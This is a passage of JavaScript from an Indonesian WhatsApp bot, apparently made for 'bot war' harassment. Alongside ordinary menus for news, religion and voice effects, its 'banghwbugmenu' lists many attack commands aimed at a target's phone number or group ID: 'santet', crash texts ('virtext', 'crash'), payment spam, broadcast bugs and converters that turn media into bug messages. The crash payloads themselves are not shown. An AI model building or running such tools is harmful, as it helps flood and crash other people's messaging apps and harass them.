if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'banghwghoib': case 'welcome': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Bug Ghoib di group ini')
} else {
const komo = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, 
}
haikal.sendMessage(m.chat, komo)
}
}
break
case 'autovn': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autorecording === true) return
global.autorecording = true
m.reply(`Berhasil mengaktifkan autovn!`)
} else if (args[0] === 'off') {
if (autorecording === false) return
global.autorecording = false
m.reply(`Berhasil menonaktifkan autovn!`)
} else {
m.reply('Pilih on atau off')
}
}
break

case 'autoketik': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoketik === true) return
global.autoketik = true
m.reply(`Berhasil mengaktifkan autoketik!`)
} else if (args[0] === 'off') {
if (autoketik === false) return
global.autoketik = false
m.reply(`Berhasil menonaktifkan autoketik!`)
} else {
m.reply('Pilih on atau off')
}
}
break

case 'autoavailable': {
if (!isCreator && !isBan) return 
if (args.length < 1) return m.reply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (autoavailable === true) return
global.autoavailable = true
m.reply(`Berhasil mengaktifkan autoavailable!`)
} else if (args[0] === 'off') {
if (autoavailable === false) return
global.autoavailable = false
m.reply(`Berhasil menonaktifkan autoavailable!`)
} else {
m.reply('Pilih on atau off')
}
}
break
//=================================================//
case 'cowner': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!args[0]) return m.reply(`*Example* : #cowner add 628xxxx`)
if (args[1]) {
orgnye = args[1]
} else if (m.quoted) {
orgnye = m.quoted.sender.split("@")[0]
}
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return m.reply('User sudah menjadi owner')
owner.push(orgnye)
m.reply(`Succes add friends`)
} else if (args[0] === "del") {
if (!isCwner) return m.reply('User bukan owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
m.reply(`Succes del friends`)
} else {
m.reply("Error")
}
}
break
//=================================================//
case 'getname': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted : m })
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted : m })
}
}
break
//=================================================//

// # BATAS # \\

//=================================================//
case 'owner': case 'crator': {
if (isBan) throw sticBanLu(from)
haikal.sendContact(m.chat, global.owner, m)
}
break
//=================================================//
case 'infobot': {
if (isBan) throw sticBanLu(from)
let buttons = [
{buttonId: `bugmenu`, buttonText: {displayText: 'BUG MENU'}, type: 1},
{buttonId: `creator`, buttonText: {displayText: 'OWNER'}, type: 1},
{buttonId: `menu`, buttonText: {displayText: 'MENU'}, type: 1}
]
const buttonMessage = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ 🇲🇨 Aku Adalah Bot War Dari Indonesia]

° Owner  : 6281214281312
° Version : 12
° Baileys : 4.4.0`,
footer: haikal.user.name,
buttons: buttons,
headerType: 3
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'menu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ 🇲🇨 Aku Adalah Bot War Dari Indonesia]

° Owner  : 6281214281312
° Version : 12
° Baileys : 4.4.0
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ██████████████████
█▓███▓██▓█▓█▓█▓▓▓█
█▓███▓██▓█▓▓██▓▓██
█▓███▓▓█▓█▓█▓█▓▓▓█
██████████████████
█▓█▓██▓██▓▓█▓█▓███
█▓▓▓█▓▓▓█▓██▓▓████
█▓█▓█▓█▓█▓▓█▓█▓███
██████████████████
 ❍ WE AR BOT WAR ❍
┏━━⊱
┣❏ banghwbugmenu  ➥ 
┣❏ Infobot  ➥ 
┗━━⊱
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ❍ Menu_Auto ❍
┏━━⊱
┣❏ Autoketik on / off  ➥ 
┣❏ Autovn on / off  ➥ 
┣❏ Autoavailable on / off  ➥ 
┗━━⊱
 ❍ Menu_Mods ❍
┏━━⊱
┣❏ Scraperimage  ➥ 
┣❏ Asupanmata  ➥ 
┣❏ Scrapconvert  ➥ 
┣❏ Nsfw  ➥ 
┣❏ Soundbot  ➥ 
┣❏ Funnmenu  ➥ 
┣❏ Primbonmenu  ➥ 
┣❏ Islamiyah  ➥ 
┣❏ Voicechanger  ➥ 
┣❏ Beritanews  ➥ 
┣❏ Cmdmenu  ➥ 
┣❏ Searchmenu  ➥ 
┣❏ Groupmenu  ➥ 
┣❏ Downloadmenu  ➥ 
┣❏ Ownermenu  ➥ 
┗━━⊱
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
banghw`, contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
}
}}, { quoted:m})
}
break
//=================================================//
case 'banghwbugmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ 🇲🇨 Aku Adalah Bot War Dari Indonesia]

° Owner  : 6281214281312
° Version : 12
° Baileys : 4.4.0
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
^BUG BOT WAR INDONESIA^
^BY : ${botname}^
██████████████████
█▓███▓██▓█▓█▓█▓▓▓█
█▓███▓██▓█▓▓██▓▓██
█▓███▓▓█▓█▓█▓█▓▓▓█
██████████████████
█▓█▓██▓██▓▓█▓█▓███
█▓▓▓█▓▓▓█▓██▓▓████
█▓█▓█▓█▓█▓▓█▓█▓███
██████████████████
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
#Emoji Terlarang Masih Project
[ EMOJI TERLARANG ]
┏━━⊱
┣❏⚔️
┣❏🗡️
┣❏🛡️
┣❏🪞
┣❏🔧
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
[ SPAM PAYMENT ]
┏━━⊱
┣❏mainpayment1
┣❏mainpayment2
┣❏mainpayment3
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
[ BUG WELCOME / PENYAPA ]
┏━━⊱
┣❏banghwghoib [ on / off ]
┗━━⊱
[ BUG REPLY GROUP ]
┏━━⊱
┣❏banghwjagoan [ reply target ]
┗━━⊱
[ BUG SANGE HARUS ADMIN ]
┏━━⊱
┣❏banghwsange [ Harus Menjadi Admin ]
┗━━⊱
[ BUG STATUS : MASUKIN LINK ]
┏━━⊱
┣❏bugtiktok [ Link ] - Bug Sw
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
[ SANTET TARGET ]
┏━━⊱
┣❏🔥 628xxx|5|5
┣❏mausantet 628xxx|5|5
┣❏diasantet 628xxx|5|5
┣❏banghwsantet 628xxx@s.whatsapp.net|10|10s
┣❏catalogpc 628xxx@s.whatsapp.net|10|10s
┗━━⊱
[ UNLIMITED BUG PC ]
┏━━⊱
┣❏banghwskuy 628xxx
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Ketik > m.chat ( di group dulu )
[ SANTET GROUP ]
┏━━⊱
┣❏banghwsantetgc  628xxx@g.us|10|10s
┣❏santetbro 628xxx@g.us|10|10s
┣❏cataloggc 628xxx@g.us|10|10s
┗━━⊱
[ UNLIMITED BUG GROUP ]
┏━━⊱
┣❏gasbanghw (id group nya)
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
[ JADI BUG ]
┏━━⊱
┣❏jadikatalog [reply sticker] jumlah
┣❏jadijago [Masukan text nya]
┣❏jadipolling [Masukan text nya]
┣❏jaditroli [Masukan text nya]
┣❏jadilokas [Masukan text nya]
┣❏jadidarknes [Masukan text nya]
┣❏jadidocu [Masukan text nya]
┣❏jadibugin𝐯ite [Masukan text nya]
┣❏jadibugpayment [Masukan text nya]
┣❏jadibugsw [Masukan text nya]
┣❏jadibugbokep [Masukan text nya]
┣❏jadibugbutton [Masukan text nya]
┣❏jadi𝐯irtext1 [Masukan text nya]
┣❏jadi𝐯irtext2 [Masukan text nya]
┣❏jadi𝐯irtext3 [Masukan text nya]
┣❏jadi𝐯irtext4 [Masukan text nya]
┣❏jadi𝐯irtext5 [Masukan text nya]
┣❏jadi𝐯irtext6 [Masukan text nya]
┣❏jadi𝐯irtext7 [Masukan text nya]
┣❏jadi𝐯irtext8 [Masukan text nya]
┣❏jadi𝐯irtext9 [Masukan text nya]
┣❏jadi𝐯irtext10 [Masukan text nya]
┣❏jadibug1 [Reply Video Jadi Bug Audio]
┣❏jadibug2 [Reply Video Jadi Bug Mp3]
┣❏jadibug3 [Reply Audio Jadi Bug Vn]
┣❏jadibug4 [Reply Sticker Jadi Bug Gambar]
┣❏jadibug5 [Reply Gambar Jadi Bug Once] 
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
[ VIRTEXT DELAY ]
┏━━⊱
┣❏banghw𝐯irtext1 [ jumlah ]
┣❏banghw𝐯irtext2 [ jumlah ]
┣❏banghw𝐯irtext3 [ jumlah ]
┣❏banghw𝐯irtext4 [ jumlah ]
┣❏banghw𝐯irtext5 [ jumlah ]
┣❏banghw𝐯irtext6 [ jumlah ]
┣❏banghw𝐯irtext7 [ jumlah ]
┣❏banghw𝐯irtext8 [ jumlah ]
┣❏banghw𝐯irtext9 [ jumlah ]
┣❏banghw𝐯irtext10 [ jumlah ]
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
[ BUG SPAM GROUP DAN CHAT]
┏━━⊱
┣❏🥀 [ jumlah ]
┣❏🐍 [ jumlah ]
┣❏🦂 [ jumlah ]
┣❏🌷 [ jumlah ]
┣❏👽 [ jumlah ]
┣❏️👾 [ jumlah ]
┣❏🪐 [ jumlah ]
┣❏🦴 [ jumlah ]
┣❏☝ [ jumlah ]
┣❏🏻 [ jumlah ]
┣❏🦖 [ jumlah ]
┣❏🦕 [ jumlah ]
┣❏👿 [ jumlah ]
┣❏🐉 [ jumlah ]
┣❏⚡ [ jumlah ]
┣❏💥 [ jumlah ]
┣❏🌪️ [ jumlah ]
┣❏🍂 [ jumlah ]
┣❏🍃 [ jumlah ]
┣❏🌴 [ jumlah ]
┣❏🌿 [ jumlah ]
┣❏🍀 [ jumlah ]
┣❏🪵 [ jumlah ]
┣❏🦥 [ jumlah ]
┣❏🌳 [ jumlah ]
┣❏🍁 [ jumlah ]
┣❏🎋 [ jumlah ]
┣❏🥜 [ jumlah ]
┣❏🌰 [ jumlah ]
┣❏🥔 [ jumlah ]
┣❏🧄 [ jumlah ]
┣❏🍆 [ jumlah ]
┣❏🥑 [ jumlah ]
┣❏🫑 [ jumlah ]
┣❏🥬 [ jumlah ]
┣❏🥒 [ jumlah ]
┣❏🥦 [ jumlah ]
┣❏🌽 [ jumlah ]
┣❏🧅 [ jumlah ]
┣❏🍠 [ jumlah ]
┣❏🥕 [ jumlah ]
┣❏🌶️ [ jumlah ]
┣❏🍅 [ jumlah ]
┣❏🥥 [ jumlah ]
┣❏🍇 [ jumlah ]
┣❏🫐 [ jumlah ]
┣❏🫒 [ jumlah ]
┣❏🥝 [ jumlah ]
┣❏🍐 [ jumlah ]
┣❏🍏 [ jumlah ]
┣❏🍈 [ jumlah ]
┣❏🍋 [ jumlah ]
┣❏🍌 [ jumlah ]
┣❏🍍 [ jumlah ]
┣❏🥭 [ jumlah ]
┣❏🍊 [ jumlah ]
┣❏🍑 [ jumlah ]
┣❏🍉 [ jumlah ]
┣❏🍎 [ jumlah ]
┣❏🍒 [ jumlah ]
┣❏🍓 [ jumlah ]
┣❏banghw1 [ jumlah ]
┣❏banghw2 [ jumlah ]
┣❏banghw3 [ jumlah ]
┣❏banghw4 [ jumlah ]
┣❏banghw5 [ jumlah ]
┣❏banghw6 [ jumlah ]
┣❏banghw7 [ jumlah ]
┣❏banghw8 [ jumlah ]
┣❏banghw9 [ jumlah ]
┣❏banghw10 [ jumlah ]
┣❏banghw11 [ jumlah ]
┣❏banghw12 [ jumlah ]
┣❏banghw13 [ jumlah ]
┣❏banghw14 [ jumlah ]
┣❏banghw15 [ jumlah ]
┣❏banghw16 [ jumlah ]
┣❏banghw17 [ jumlah ]
┣❏banghw18 [ jumlah ]
┣❏banghw19 [ jumlah ]
┣❏banghw20 [ jumlah ]
┣❏banghw21 [ jumlah ]
┣❏banghw22 [ jumlah ]
┣❏banghw23 [ jumlah ]
┣❏banghw24 [ jumlah ]
┣❏banghw25 [ jumlah ]
┣❏banghw26 [ jumlah ]
┣❏banghw27 [ jumlah ]
┣❏banghw28 [ jumlah ]
┣❏banghw29 [ jumlah ]
┣❏banghw30 [ jumlah ]
┣❏banghw31 [ jumlah ]
┣❏banghw32 [ jumlah ]
┣❏banghw33 [ jumlah ]
┣❏banghw34 [ jumlah ]
┣❏banghw35 [ jumlah ]
┣❏banghw36 [ jumlah ]
┣❏banghw37 [ jumlah ]
┣❏banghw38 [ jumlah ]
┣❏banghw39 [ jumlah ]
┣❏banghw40 [ jumlah ]
┣❏banghw41 [ jumlah ]
┣❏banghw42 [ jumlah ]
┣❏banghw43 [ jumlah ]
┣❏banghw44 [ jumlah ]
┣❏banghw45 [ jumlah ]
┣❏banghw46 [ jumlah ]
┣❏banghw47 [ jumlah ]
┣❏banghw48 [ jumlah ]
┣❏banghw49 [ jumlah ]
┣❏banghw50 [ jumlah ]
┣❏banghw51 [ jumlah ]
┣❏banghw52 [ jumlah ]
┣❏banghw53 [ jumlah ]
┣❏banghw54 [ jumlah ]
┣❏banghw55 [ jumlah ]
┣❏banghw56 [ jumlah ]
┣❏banghw57 [ jumlah ]
┣❏banghw58 [ jumlah ]
┣❏banghw59 [ jumlah ]
┣❏banghw60 [ jumlah ]
┣❏buttonkematian [ jumlah ]
┣❏mexcrot [ jumlah ]
┣❏banghwnih [ jumlah ]
┣❏okemex [ jumlah ]
┣❏ahyangbetul [ jumlah ]
┣❏ampunsuhu [ jumlah ]
┣❏mexdemam [ jumlah ]
┣❏inibutton [ jumlah ]
┣❏jutrol [ jumlah ]
┣❏cumadocu [ jumlah ]
┣❏testbutton [ jumlah ]
┣❏bully [ jumlah ]
┣❏waifu [ jumlah ]
┣❏cuddle [ jumlah ]
┣❏neko [ jumlah ]
┣❏cry [ jumlah ]
┣❏kiss [ jumlah ]
┣❏hug [ jumlah ]
┣❏lick [ jumlah ]
┣❏awoo [ jumlah ]
┣❏yeet [ jumlah ]
┣❏bite [ jumlah ]
┣❏lick [ jumlah ]
┣❏banghwkangbuttton [ jumlah ]
┣❏banghwdelay [ jumlah ]
┣❏banghwstik [ jumlah ]
┣❏banghwbugie [ jumlah ]
┣❏buglokas [ jumlah ]
┣❏banghwtod [ jumlah ]
┣❏banghwbokep [ jumlah ]
┣❏bugin𝐯ite [ jumlah ] Pc
┣❏banghwha [ jumlah ]
┣❏banghwhi [ jumlah ]
┣❏banghwhu [ jumlah ]
┣❏banghwhe [ jumlah ]
┣❏banghwba [ jumlah ]
┣❏banghwbe [ jumlah ]
┣❏banghwbu [ jumlah ]
┣❏banghwbi [ jumlah ]
┣❏banghwca [ jumlah ]
┣❏banghwci [ jumlah ]
┣❏banghwcu [ jumlah ]
┣❏banghwco [ jumlah ]
┣❏banghwbug1 [ jumlah ]
┣❏banghwbug2 [ jumlah ]
┣❏banghwbug3 [ jumlah ]
┣❏banghwbug4 [ jumlah ]
┣❏banghwbug5 [ jumlah ]
┣❏banghwbug6 [ jumlah ]
┣❏banghwbug7 [ jumlah ]
┣❏banghwpoll [ jumlah ]
┣❏banghwtag [ jumlah ]
┣❏inibug [ jumlah ]
┣❏hiya [ jumlah ]
┣❏lokas [ jumlah ]
┣❏catalog [ jumlah ]
┣❏banghwdocu [ jumlah ]
┣❏banghwdaca [ jumlah ]
┣❏duc [ jumlah ]
┣❏ducu [ jumlah ]
┣❏banghwtroli [ jumlah ]
┣❏banghwtroli2 [ jumlah ]
┣❏banghwtroli3 [ jumlah ]
┣❏banghwjhon2 [ jumlah ]
┣❏banghwjhon [ jumlah ]
┣❏banghwbutton [ jumlah ]
┣❏banghwtrol [ jumlah ]
┣❏banghwkatalog [ jumlah ]
┣❏banghwaducu [ jumlah ]
┣❏banghwdaca [ jumlah ]
┣❏banghwdraknes [ jumlah ]
┣❏banghwslebew [ jumlah ]
┣❏banghwsu [ jumlah ]
┣❏banghwtol [ jumlah ]
┣❏banghwmemek [ jumlah ]
┣❏banghwcontol [ jumlah ]
┣❏banghwtextv [ jumlah ]
┣❏banghwgas [ jumlah ]
┣❏banghw𝐯irtext [ jumlah ]
┣❏banghw𝐯irtext1 [ jumlah ]
┣❏banghw𝐯irtext2 [ jumlah ]
┣❏banghw𝐯irtext3 [ jumlah ]
┣❏banghwcrash [ jumlah ]
┣❏banghwcrash1 [ jumlah ]
┣❏banghwcrash2 [ jumlah ]
┣❏banghwcrash3 [ jumlah ]
┣❏banghwcrash4 [ jumlah ]
┣❏banghwcrash5 [ jumlah ]
┣❏banghwcrash6 [ jumlah ]
┣❏banghwcrash7 [ jumlah ]
┣❏banghwlokas [ jumlah ]
┣❏banghwlokas2 [ jumlah ]
┣❏banghwkangbug [ jumlah ]
┣❏banghwkangbug1 [ jumlah ]
┣❏banghwbar [ jumlah ]
┣❏banghwoke [ jumlah ]
┣❏banghwewe [ jumlah ]
┣❏banghwngentod [ jumlah ]
┣❏banghw1 [ jumlah ]
┣❏banghw2 [ jumlah ]
┣❏banghw3 [ jumlah ]
┣❏banghw4 [ jumlah ]
┣❏banghw5 [ jumlah ]
┣❏banghw6 [ jumlah ]
┣❏banghw7 [ jumlah ]
┣❏banghw8 [ jumlah ]
┣❏banghw9 [ jumlah ]
┣❏banghw10 [ jumlah ]
┣❏banghw11 [ jumlah ]
┣❏banghw12 [ jumlah ]
┣❏crashar1 [ jumlah ]
┣❏crashar2 [ jumlah ]
┣❏crashar3 [ jumlah ]
┣❏crashar4 [ jumlah ]
┣❏crashar5 [ jumlah ]
┣❏crashar6 [ jumlah ]
┣❏crashar7 [ jumlah ]
┣❏crashar8 [ jumlah ]
┣❏crashar9 [ jumlah ]
┣❏crashar10 [ jumlah ]
┣❏crashar11 [ jumlah ]
┣❏crashar12 [ jumlah ]
┣❏crashar13 [ jumlah ]
┣❏crashar14 [ jumlah ]
┣❏crashar15 [ jumlah ]
┣❏crashar16 [ jumlah ]
┣❏crashar17 [ jumlah ]
┣❏crashar18 [ jumlah ]
┣❏crashar19 [ jumlah ]
┣❏crashar20 [ jumlah ]
┣❏spam [ Reply Pesan ]
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
[ BUG BROADCAST ]
┏━━⊱
┣❏bugbcimage [ Bug image Broadcast ]
┣❏bugbcvideo [ Bug Video Broadcast ]
┣❏bugbcaudio [ Bug Audio Broadcast ]
┣❏bugbctext [ Bug Text Broadcast ]
┗━━⊱`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'bot': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` © Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
"description": ` - © banghw

◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIB LANJUT ✌️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© © banghwWE ARE NOT MASTOD`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'soundbot': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ SOUNDBOT MENU ] 
┣❏banghw
┣❏ngakak
┣❏ketawa
┣❏awkwk
┣❏bang
┣❏nob
┣❏musik
┣❏mastah
┣❏slebew
┣❏cantik
┣❏kesel
┣❏ngeselin
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'funnmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ FUN MENU ]
┣❏bagaimanakah
┣❏kapankah
┣❏apakah
┣❏bisakah
┣❏rate
┣❏wangy
┣❏gantengcek
┣❏cekganteng
┣❏cantikcek
┣❏cekcantik
┣❏sangecek
┣❏ceksange
┣❏gaycek
┣❏cekgay
┣❏lesbicek
┣❏halah
┣❏hilih
┣❏huluh
┣❏heleh
┣❏holoh
┣❏delttt]
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'primbonmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ PRIMBON MENU ]
nomorhoki
┣❏artimimpi
┣❏artinama
┣❏ramaljodoh
┣❏ramaljodohbali
┣❏suamiistri
┣❏ramalcinta
┣❏cocoknama
┣❏pasangan
┣❏jadiannikah
┣❏sifatusaha
┣❏rezeki
┣❏pekerjaan
┣❏nasib
┣❏penyakit
┣❏tarot
┣❏fengshui
┣❏haribaik
┣❏harisangar
┣❏harisial
┣❏nagahari
┣❏arahrezeki
┣❏peruntungan
┣❏weton
┣❏karakter
┣❏keberuntungan
┣❏memancing
┣❏masasubur
┣❏zodiak
┣❏shio
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'islamiyah': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ ISLAM MENU ]
┣❏hadist
┣❏alquran
┣❏juzamma
┣❏tafsirsurah
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'beritanews': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ BERITA MENU ]
┣❏merdeka-news
┣❏kontan-news 
┣❏cnbc-news
┣❏tribun-news
┣❏indozone-news
┣❏kompas-news
┣❏detik-news
┣❏daily-news
┣❏inews-news
┣❏okezone-news
┣❏sindo-news
┣❏tempo-news
┣❏antara-news
┣❏cnn-news
┣❏fajar-news
┗━━⊱[ banghw] `,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'groupmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ GROUP MENU ]
┣❏linkgroup
┣❏ephemeral [di group]
┣❏setppgc /full [image]
┣❏setppbot / full [image]
┣❏setname [text]
┣❏setdesc [text]
┣❏group [option]
┣❏editinfo [option]
┣❏add @user
┣❏kick @user
┣❏ban [targer]
┣❏hidetag [text]
┣❏tagall [text]
┣❏promote @user
┣❏demote @user
┣❏mute on / off
┣❏getname
┣❏translate
┣❏kalkulator
┣❏getpic
┣❏penjara
┣❏bcgroup
┣❏bctext
┣❏broadcast
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'voicechanger': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ VOICE MENU ]
┣❏bass
┣❏blown
┣❏deep
┣❏earrape
┣❏fast
┣❏fat
┣❏nightcore
┣❏reverse
┣❏robot
┣❏slow
┣❏tupai
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'asupanmata': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Asupan Mata* 
bokep`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'searchmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
┏━━⊱[ SEARCH MENU ]
┣❏gimage [query]
┣❏pinterest [query]
┣❏wallpaper [query]
┣❏wikimedia [query]
┣❏ringtone [query]
┣❏searchgroups [query]
┗━━⊱[ banghw]`,
contextInfo:{"externalAdReply": {"title": `SC banghw`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
